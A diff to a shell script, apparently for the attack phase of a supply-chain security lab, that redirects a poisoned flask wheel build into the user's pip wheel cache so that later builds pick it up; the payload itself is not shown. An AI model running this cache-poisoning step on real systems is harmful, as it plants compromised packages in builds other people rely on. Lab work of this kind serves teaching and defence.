@@ -3,7 +3,7 @@
 # This script is used during the BREAK phase of the lab.
 set -euo pipefail
 
-CACHE_DIR="/cache/pip"
+CACHE_DIR="${HOME}/.cache/pip/wheels"
 POISON_DIR="/tmp/poison-flask"
 
 echo "[attack] Creating poisoned flask package..."
@@ -39,6 +39,7 @@ PYEOF
 
 echo "[attack] Building poisoned wheel..."
 cd "${POISON_DIR}"
+mkdir -p "${CACHE_DIR}"
 pip wheel . -w "${CACHE_DIR}" --no-deps 2>/dev/null
 
 echo "[attack] Cache poisoned. Next build using this cache will be compromised."
